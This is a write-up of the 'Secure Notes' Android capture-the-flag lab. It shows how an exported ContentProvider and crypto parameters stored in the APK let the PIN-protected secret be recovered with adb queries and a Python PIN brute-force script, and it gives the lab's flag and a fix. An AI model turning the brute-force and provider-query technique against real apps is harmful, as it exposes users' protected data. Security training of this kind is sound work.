# Mobile Hacking Lab — Secure Notes Write-Up

> **Lab:** Secure Notes
> **Category:** Android Content Provider
> **Difficulty:** Beginner
> **Flag:** `CTF{D1d_y0u_gu3ss_1t!1?}`

---

## Table of Contents

1. [Overview](#overview)
2. [Environment Setup](#environment-setup)
3. [Static Analysis](#static-analysis)
4. [Understanding the Vulnerability](#understanding-the-vulnerability)
5. [Exploitation](#exploitation)
6. [Brute Force Script](#brute-force-script)
7. [Root Cause & Fix](#root-cause--fix)

---

## Overview

The Secure Notes lab challenges you to retrieve a PIN-protected secret from an Android application by exploiting a misconfigured content provider. The app encrypts a secret note using AES with a PIN-derived key, but exposes its content provider to any app or tool on the device including `adb`.

**Vulnerability:** `android:exported="true"` on a sensitive `ContentProvider`

**Impact:** Any process on the device can query the provider and brute-force the PIN with no rate limiting or lockout.

---

## Environment Setup

### Prerequisites

- Kali Linux (attacker machine)
- Android Emulator (or rooted device)
- `adb`, `apktool`, `jadx`

### Install the APK

```bash
# Confirm emulator is connected
adb devices
```

```
List of devices attached
emulator-5554   device
```

```bash
# Install the app
adb install com.mobilehackinglab.securenotes.apk
```

```
Performing Streamed Install
Success
```

```bash
# Verify installation
adb shell pm list packages | grep securenotes
```

```
package:com.mobilehackinglab.securenotes
```

---

## Static Analysis

### Step 1: Decode the APK

```bash
apktool d com.mobilehackinglab.securenotes.apk -o securenotes_decoded
```

### Step 2: Inspect the Android Manifest

```bash
cat securenotes_decoded/AndroidManifest.xml | grep -A 3 "provider"
```

```xml
<provider
    android:authorities="com.mobilehackinglab.securenotes.secretprovider"
    android:enabled="true"
    android:exported="true"
    android:name="com.mobilehackinglab.securenotes.SecretDataProvider"/>
```

**Key finding:** `android:exported="true"` means the `SecretDataProvider` is accessible to any app or external tool on the device.

### Step 3: Analyze the Content Provider (Smali / JADX)

```bash
# Find the provider smali file
find securenotes_decoded/smali* -name "SecretDataProvider*"
```

```
securenotes_decoded/smali_classes3/com/mobilehackinglab/securenotes/SecretDataProvider.smali
```

Decompiling with `jadx` reveals the `query()` method logic:

```kotlin
// SecretDataProvider.kt (reconstructed)
override fun query(uri: Uri, projection: Array<String>?, selection: String?, ...): Cursor? {
    // Expects selection to start with "pin="
    if (selection != null && selection.startsWith("pin=")) {
        val enteredPin = selection.removePrefix("pin=")
        val formattedPin = String.format("%04d", enteredPin.toInt())

        // Attempt decryption using the PIN
        val secret = runCatching { decryptSecret(formattedPin) }.getOrNull()

        // If decryption succeeds, return cursor with "Secret" column
        if (secret != null) {
            return MatrixCursor(arrayOf("Secret")).apply {
                addRow(arrayOf(secret))
            }
        }
    }
    return null
}
```

The provider works as follows:

1. Reads the PIN from the `selection` parameter (format: `pin=XXXX`)
2. Derives an AES key from the PIN using PBKDF2WithHmacSHA1
3. Decrypts the secret using AES/CBC/PKCS5Padding
4. Returns the plaintext in a cursor column named `Secret`

### Step 4: Extract Crypto Parameters from Assets

The encrypted secret and all key derivation parameters are stored in plaintext inside the APK:

```bash
unzip com.mobilehackinglab.securenotes.apk assets/config.properties -d /tmp/out
cat /tmp/out/assets/config.properties
```

```properties
encryptedSecret=bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=
salt=m2UvPXkvte7fygEeMr0WUg==
iv=L15Je6YfY5owgIckR9R3DQ==
iterationCount=10000
```

All the ingredients needed to crack the PIN offline are exposed in the APK.

### Step 5: Analyse MainActivity

The `MainActivity` shows the intended app flow — it calls the same provider internally:

```java
private final void querySecretProvider(String pin) {
    Uri uri = Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider");
    String selection = "pin=" + pin;
    Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
    // reads "Secret" column and displays it
}
```

This is exactly what we replicate via `adb` — the only difference is we do it from outside the app.

---

## Understanding the Vulnerability

### Normal Flow vs Attack Flow

```
Normal Flow (intended):
  User types PIN -> MainActivity -> ContentProvider -> decrypt -> show result

Attack Flow (exploit):
  Attacker (adb) -> ContentProvider -> decrypt -> show result
  Possible ONLY because android:exported="true"
```

### Why Brute Force Works

The content provider has no protection against external queries:

1. No authentication — no signature or permission check
2. No rate limiting — unlimited queries allowed
3. No lockout — wrong PINs do not block future attempts
4. Small PIN space — only 10,000 possibilities (0000 to 9999)

---

## Exploitation

### Method 1: Direct ADB Query (if PIN is known)

```bash
adb shell content query \
  --uri content://com.mobilehackinglab.securenotes.secretprovider/ \
  --where "pin=2580"
```
<img width="758" height="100" alt="42095224-ac70-4fdf-b9cf-8d3448474e3b-1791617989531_image" src="https://github.com/user-attachments/assets/eef1ebe8-64bb-41a9-b31a-0c328cf365a7" />


```
Row: 0 Secret=CTF{D1d_y0u_gu3ss_1t!1?}
```




### Method 2: Manual PIN Testing via the App

Entering a wrong PIN:

<img width="354" height="720" alt="f4957334-881a-41c7-9955-129e86274655-1791618024399_image" src="https://github.com/user-attachments/assets/af6a3d66-caca-4da4-a689-ff9a73b05c41" />

Entering the correct PIN:

<img width="350" height="720" alt="07acf9c2-19b6-4870-abdd-faae813eea38-1791618058048_image" src="https://github.com/user-attachments/assets/64d5dfd6-97d1-44e1-8813-e7c82be72696" />

---

## Brute Force Script

Since the PIN is unknown, we brute-force all 10,000 combinations locally using the crypto parameters extracted from the APK:

```python
#!/usr/bin/env python3
"""
Secure Notes - PIN Brute Force
Replicates the app's PBKDF2 + AES/CBC decryption to find the correct PIN.
"""
import base64
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Values from assets/config.properties
encrypted_secret = base64.b64decode("bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=")
salt             = base64.b64decode("m2UvPXkvte7fygEeMr0WUg==")
iv               = base64.b64decode("L15Je6YfY5owgIckR9R3DQ==")
iteration_count  = 10000

def try_decrypt(pin: str):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(), length=32,
        salt=salt, iterations=iteration_count,
        backend=default_backend()
    )
    key = kdf.derive(pin.encode())
    try:
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decrypted = cipher.decryptor().update(encrypted_secret)
        pad_len = decrypted[-1]
        if 1 <= pad_len <= 16:
            return decrypted[:-pad_len].decode("utf-8")
    except Exception:
        return None

print("[*] Brute forcing 0000-9999...")
for i in range(10000):
    pin = f"{i:04d}"
    result = try_decrypt(pin)
    if result:
        print(f"[+] PIN   : {pin}")
        print(f"[+] Flag  : {result}")
        break
```

Install dependency and run:

```bash
pip install cryptography --break-system-packages
python3 bruteforce_pin.py
```

Output:

```
[*] Brute forcing 0000-9999...
[+] PIN   : 2580
[+] Flag  : CTF{D1d_y0u_gu3ss_1t!1?}
```

Verify on device:

```bash
adb shell content query \
  --uri content://com.mobilehackinglab.securenotes.secretprovider/ \
  --where "pin=2580"
```

---

## Root Cause & Fix

### Root Cause

```xml
<!-- VULNERABLE: any process can query this provider -->
<provider
    android:authorities="com.mobilehackinglab.securenotes.secretprovider"
    android:exported="true"
    android:name="com.mobilehackinglab.securenotes.SecretDataProvider"/>
```

### Fix

```xml
<!-- SECURE: only the app itself can query this provider -->
<provider
    android:authorities="com.mobilehackinglab.securenotes.secretprovider"
    android:exported="false"
    android:name="com.mobilehackinglab.securenotes.SecretDataProvider"/>
```

### Additional Recommendations

1. Do not ship crypto parameters in APK assets — `config.properties` exposes the salt, IV, and iteration count, enabling offline brute force.
2. Use a stronger secret — a 4-digit PIN provides only 10,000 combinations; prefer longer PINs or biometric-gated keys.
3. Add rate limiting — even if the provider must be exported, track and limit failed attempts.
4. Use Android Keystore — store encryption keys in the hardware-backed keystore instead of deriving them from a weak PIN.
